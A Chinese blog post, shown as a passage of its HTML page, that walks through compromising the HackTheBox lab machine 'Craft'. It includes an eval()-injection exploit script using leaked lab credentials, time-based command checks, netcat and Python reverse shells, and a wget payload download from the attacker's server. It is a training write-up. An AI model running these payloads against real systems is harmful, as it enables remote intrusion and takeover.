@@ -1,0 +1,1060 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="hackthebox：https://www.hackthebox.eu/home/machines/profile/197  将Hackthebox ip添加入hosts文件 1echo &amp;quot;10.10.10.110 craft.htb&amp;quot; &amp;gt;&amp;gt; /etc/hosts  reconnmap进行扫描 12nmap -sV -sT -sC craft.htb-sC 根据端">
+<meta name="keywords" content="Web安全，移动安全，windows安全，漏洞挖掘，代码审计，智能合约">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackthebox-Craft">
+<meta property="og:url" content="https://wh0ale.github.io/2020/01/06/hackthebox-Craft/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="hackthebox：https://www.hackthebox.eu/home/machines/profile/197  将Hackthebox ip添加入hosts文件 1echo &amp;quot;10.10.10.110 craft.htb&amp;quot; &amp;gt;&amp;gt; /etc/hosts  reconnmap进行扫描 12nmap -sV -sT -sC craft.htb-sC 根据端">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_16-43-48.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_16-56-05.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-04-01.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-18-45.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-19-52.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-33-00.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-35-41.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-40-26.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-40-27.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-56-11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_18-58-49.png">
+<meta property="og:updated_time" content="2020-01-06T10:59:16.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hackthebox-Craft">
+<meta name="twitter:description" content="hackthebox：https://www.hackthebox.eu/home/machines/profile/197  将Hackthebox ip添加入hosts文件 1echo &amp;quot;10.10.10.110 craft.htb&amp;quot; &amp;gt;&amp;gt; /etc/hosts  reconnmap进行扫描 12nmap -sV -sT -sC craft.htb-sC 根据端">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_16-43-48.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2020/01/06/hackthebox-Craft/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>hackthebox-Craft | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2020/01/06/hackthebox-Craft/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">hackthebox-Craft
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-01-06 16:42:15 / 修改时间：18:59:16" itemprop="dateCreated datePublished" datetime="2020-01-06T16:42:15+08:00">2020-01-06</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">11k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">10 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p>hackthebox：<a href="https://www.hackthebox.eu/home/machines/profile/197" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/197</a></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_16-43-48.png" alt></p>
+<p>将Hackthebox ip添加入hosts文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.10.110 craft.htb&quot; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<h1 id="recon"><a href="#recon" class="headerlink" title="recon"></a>recon</h1><p>nmap进行扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -sC craft.htb</span><br><span class="line">-sC 根据端口识别的服务，调用默认脚本。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_16-56-05.png" alt></p>
+<p>开放<code>22</code>和<code>443</code>端口。</p>
+<p>访问<code>https://craft.htb</code>提示</p>
+<blockquote>
+<p>Craft aims to be the largest repository of US-produced craft brews accessible over REST. In the future we will release a mobile app to interface with our public rest API as well as a brew submission process, but for now, check out our API!</p>
+</blockquote>
+<p>应该是存在REST的漏洞</p>
+<p>在网页上随便点击，发现跳转到<code>https://api.craft.htb/api/</code>和<code>https://gogs.craft.htb/</code>都无法正常响应，在<code>/etc/hosts/</code>文件中添加这两个文件才能访问它。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;10.10.10.110 gogs.craft.htb&quot; &gt;&gt; /etc/hosts</span><br><span class="line">$ echo &quot;10.10.10.110 api.craft.htb&quot; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>添加后再次访问</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-04-01.png" alt></p>
+<p>出于好奇，我检查了漏洞<code>Gogs</code>并发现了CVE-2018-18925和CVE-2018-20303：</p>
+<blockquote>
+<p>Gogs 0.11.66允许远程执行代码，因为它不能正确验证会话ID，如file.go中文件会话提供程序中的“ ..”会话文件伪造所证明的。 <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-18925" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2018-18925</a></p>
+</blockquote>
+<blockquote>
+<p>在0.11.82.1218之前的Gogs中的pkg / tool / path.go中，文件上载功能中的目录遍历可以使攻击者在服务器上的数据/会话下创建文件。 <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-20303" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2018-20303</a></p>
+</blockquote>
+<p>漏洞利用程序（<a href="https://github.com/TheZ3ro/gogsownz" target="_blank" rel="noopener">GogsOwnz</a>）也是可用的，并允许在Gogs / Gitea服务器上获得管理员权限和RCE。</p>
+<p>不幸的是，<code>gogs.craft.htb</code>显示的页脚表明所使用的版本不是易受攻击的版本：</p>
+<blockquote>
+<p>© 2018 Gogs 当前版本: 0.11.86.0130 页面: 4ms 模板: 0ms</p>
+</blockquote>
+<p>这确认我们的入口点可能是api。让我们调查一下。</p>
+<p>既然我们有代码源，它将极大地帮助我们进行调查。该API在带有Flask框架的Python中使用。</p>
+<p>让我们克隆它以更轻松地检查代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIT_SSL_NO_VERIFY=true git clone https://gogs.craft.htb/Craft/craft-api.git</span><br></pre></td></tr></table></figure>
+
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>在API上远程执行代码</p>
+<p>进行静态代码分析时，我要做的第一件事是检查是否使用了危险功能并将其用于命令注入。这是将贝壳放在盒子上的最简单方法。<br>如果此搜索没有给出任何结果，我将继续进行SQL注入等等。</p>
+<p>在Python中引入命令注入漏洞的最常见方式是通过<code>eval()</code>函数来运行程序中的python代码（作为参数传递）。</p>
+<p>一个快速的<code>grep</code>告诉我们在API中是否使用了此类功能：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grep -ri &quot;eval&quot; craft-api</span><br><span class="line">craft-api/craft_api/api/brew/endpoints/brew.py:        if eval(&apos;%s &gt; 1&apos; % request.json[&apos;abv&apos;]):</span><br></pre></td></tr></table></figure>
+
+<p>发现存在eval函数的点，查看<code>brew.py</code>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@auth.auth_required</span></span><br><span class="line"><span class="meta">@api.expect(beer_entry)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Creates a new brew entry.</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make sure the ABV value is sane.</span></span><br><span class="line"><span class="keyword">if</span> eval(<span class="string">'%s &gt; 1'</span> % request.json[<span class="string">'abv'</span>]):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"ABV must be a decimal value less than 1.0"</span>, <span class="number">400</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    create_brew(request.json)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="number">201</span></span><br></pre></td></tr></table></figure>
+
+<p>任何在request <code>abv</code>参数中发送的Python代码都将被解释。不幸的是，<code>@auth.auth_required</code>告知我们在使用此易受攻击的端点之前，我们首先需要一种对自己进行身份验证的方法。</p>
+<p>阅读文档和代码源后，似乎没有任何方法可以创建一个新帐户或使用已经制成的令牌对API进行身份验证。我们需要找到另一种验证方式。</p>
+<p>由于我们有权访问git存储库，因此我们可以尝试利用git/svn存储库中的常见缺陷。最常见的问题是开发人员不小心将API密钥，令牌或密码推送到存储库</p>
+<p>有一些好工具，例如<a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="noopener">truffleHog</a>或<a href="https://github.com/awslabs/git-secrets" target="_blank" rel="noopener">git-secrets</a>允许自动检索意外提交的机密和凭据。(我试了这两个工具都没能检出)</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-18-45.png" alt></p>
+<p>由于历史记录中只有6个提交，因此我们可以手动对其进行检查，以确保我们不会忘记任何内容。在提交时，<code>a2d28ed155</code>我们发现了一个有趣的commit：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-19-52.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl &quot;https://api.craft.htb/api/auth/login&quot; -k --user dinesh:4aUh0A8PbVJxgd</span><br><span class="line">&#123;&quot;token&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&quot;&#125;</span><br><span class="line">$ curl -H &quot;X-Craft-Api-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&quot;  &quot;https://api.craft.htb/api/auth/check&quot; -k</span><br><span class="line">&#123;&quot;message&quot;:&quot;Token is valid!&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们已通过认证！请注意，此API不使用通常的<code>Authorization: Bearer &lt;token&gt;</code>标头，而是使用格式的自定义标头<code>X-Craft-Api-Token: &lt;token&gt;</code>。很容易忽略这一点，这就是为什么花时间阅读代码并理解应用程序的内部工作原理很重要的原因。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># craft_api/api/auth/endpoints/auth.py</span><br><span class="line">token = request.headers[&apos;X-Craft-Api-Token&apos;]</span><br></pre></td></tr></table></figure>
+
+<p><strong>现在，我们拥有执行命令注入所需的所有信息。</strong></p>
+<p>由于我们需要在<code>brew</code>端点上进行身份验证并执行多个查询，因此我决定编写一个脚本以避免编写上千个curl请求。</p>
+<p>由于<code>craft-api/tests/test.py</code>已经提供了坚实的基础，因此无需从头开始。我对其进行了一些微调，以最终得到以下脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">'https://api.craft.htb/api/auth/login'</span>,  auth=(<span class="string">'dinesh'</span>, <span class="string">'4aUh0A8PbVJxgd'</span>), verify=<span class="literal">False</span>)</span><br><span class="line">json_response = json.loads(response.text)</span><br><span class="line">token = json_response[<span class="string">'token'</span>]</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'X-Craft-API-Token'</span>: token, <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">'https://api.craft.htb/api/auth/check'</span>, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">print(response.text)  <span class="comment"># make sure token is valid</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = input(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line">    brew_dict = &#123;&#125;</span><br><span class="line">    brew_dict[<span class="string">'abv'</span>] = <span class="string">'__import__("os").popen("&#123;&#125;").read()'</span>.format(cmd)</span><br><span class="line">    brew_dict[<span class="string">'name'</span>] = <span class="string">'bullshit'</span></span><br><span class="line">    brew_dict[<span class="string">'brewer'</span>] = <span class="string">'bullshit'</span></span><br><span class="line">    brew_dict[<span class="string">'style'</span>] = <span class="string">'bullshit'</span></span><br><span class="line"></span><br><span class="line">    json_data = json.dumps(brew_dict)</span><br><span class="line">    response = requests.post(<span class="string">'https://api.craft.htb/api/brew/'</span>, headers=headers, data=json_data, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>eval()</code>将运行任何python代码，因此我们将使用此lambda函数<code>__import__(&quot;os&quot;).popen(&quot;CMD&quot;).read()</code>从python代码运行os命令。</p>
+<p>我添加了一个，<code>input(&#39;&gt; &#39;)</code>因此我们只需要键入命令即可在API上运行它。</p>
+<p>但是，我们没有任何可用的输出，那么我们如何知道命令已成功执行？</p>
+<p><strong>使用基于时间的注入;）</strong></p>
+<p>我们将注入一个<code>sleep 5</code>命令：</p>
+<ul>
+<li>如果API挂起5秒钟，则表明我们的命令已成功执行</li>
+<li>如果API立即响应，则注入失败。</li>
+</ul>
+<p>使用<code>requests</code>库<code>elapsed.total_seconds()</code>函数，我们可以显示成功请求所花费的时间。</p>
+<p>我将其添加到脚本中，以便我们可以轻松查看<code>sleep 5</code>注入是否工作正常。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">print(&quot;Execution time: &#123;&#125;&quot;.format(response.elapsed.total_seconds()))</span><br></pre></td></tr></table></figure>
+
+<p>Let&#39;s it give a try:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">&#123;&quot;message&quot;:&quot;Token is valid!&quot;&#125;</span><br><span class="line"></span><br><span class="line">&gt; test</span><br><span class="line">Execution time: 0.147798</span><br><span class="line">&gt; sleep 5</span><br><span class="line">Execution time: 5.158874</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<p>执行语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew_dict[&apos;abv&apos;] = &apos;__import__(&quot;os&quot;).popen(&quot;&#123;&#125; &amp;&amp; sleep 5&quot;).read()&apos;.format(cmd)</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>wget --help</code>命令执行需要3秒钟，因此这意味着命令可以正常运行。虽然<code>curl --help</code>失败了，<code>sleep 3</code>没有开始的意思<code>curl</code>是不是可能没有安装。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">&#123;&quot;message&quot;:&quot;Token is valid!&quot;&#125;</span><br><span class="line"></span><br><span class="line">&gt; curl --help</span><br><span class="line">Execution time: 0.162407</span><br><span class="line">&gt; wget --help</span><br><span class="line">Execution time: 3.160078</span><br></pre></td></tr></table></figure>
+
+<p>这个小技巧将使我们获得宝贵的反馈，以了解我们的命令是成功还是失败。</p>
+<p>让我们尝试打开我们经典的反向shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>并在API上启动我们的测试脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">&#123;&quot;message&quot;:&quot;Token is valid!&quot;&#125;</span><br><span class="line"></span><br><span class="line">&gt; nc -e /bin/sh 10.10.10.85 8585</span><br><span class="line">Execution time: 0.218422</span><br><span class="line">&gt; nc --help</span><br><span class="line">Execution time: 4.412322</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<p>奇怪的是，这<code>nc</code>似乎不起作用，但似乎已安装。这很奇怪，但是让我们继续使用另一种类型的反向外壳。由于我们确定已经安装了python，因此我们使用python反向外壳。</p>
+<p>为了简化操作，我们启动一个小型http服务器来托管我们的python反向shell文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ cat hg8.py</span><br><span class="line">import socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;10.10.10.85&quot;,8585));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1);</span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br><span class="line">$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>
+
+<p>回到我们的原始终端，让我们启动注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">&#123;&quot;message&quot;:&quot;Token is valid!&quot;&#125;</span><br><span class="line"></span><br><span class="line">wget 10.10.14.33:8000/hg8.py -O /tmp/hg8.py</span><br><span class="line">Execution time: 1.15602</span><br><span class="line">&gt; python /tmp/hg8.py</span><br></pre></td></tr></table></figure>
+
+<p>netcat监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 8585</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-33-00.png" alt></p>
+<p><em>注意：现在，我们已经准备就绪，可以调查为什么原始的netcat命令不起作用了。</em></p>
+<p>netcat此框随附的版本为Busybox版本。手动状态：</p>
+<p>在此版本中，<code>-e</code>选项必须为last。因此，如果我们运行<code>nc 10.10.10.85 8585 -e /bin/sh</code>而不是执行<code>nc -e /bin/sh 10.10.10.85 8585</code>该命令，则将成功完成。我尝试了，它起作用了。奇怪，但对未来要牢记。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-35-41.png" alt></p>
+<h1 id="docker-to-Physical-Machines"><a href="#docker-to-Physical-Machines" class="headerlink" title="docker to Physical Machines"></a>docker to Physical Machines</h1><p>现在回到我们的主题。我们在API上获得了shell。不幸的是，正如您在<code>id</code>命令中注意到的那样，似乎我们在docker容器中。</p>
+<p>发现数据库信息</p>
